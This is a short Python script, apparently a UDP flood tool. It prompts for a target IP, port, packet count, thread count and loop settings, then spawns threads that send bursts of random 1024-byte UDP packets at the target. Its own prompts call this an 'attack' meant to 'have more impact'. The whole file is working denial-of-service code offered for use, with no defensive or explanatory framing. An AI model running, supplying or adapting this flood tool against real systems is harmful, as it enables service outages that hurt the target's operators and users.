import random
import socket
import threading
import keyboard
import time

ip = str(input(" IP: "))
port = int(input(" PORT: "))
times = int(input(" PACKETS PER THREAD: "))
threads = int(input(" THREADS: "))
loopOfLoop = int(input(" LOOPS OF LOOPS (restarting attack to have more impact): "))
sleepTime  = float(input(" SLEEP TIME BETWEEN LOOPS: "))
def main():
	for y in range(threads):
		th = threading.Thread(target=go)
		th.start()
def go():
	loop = 0
	data = random._urandom(1024)
	while 1:
		time.sleep(sleepTime)
		while loop<loopOfLoop:
			loop+=1
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
main()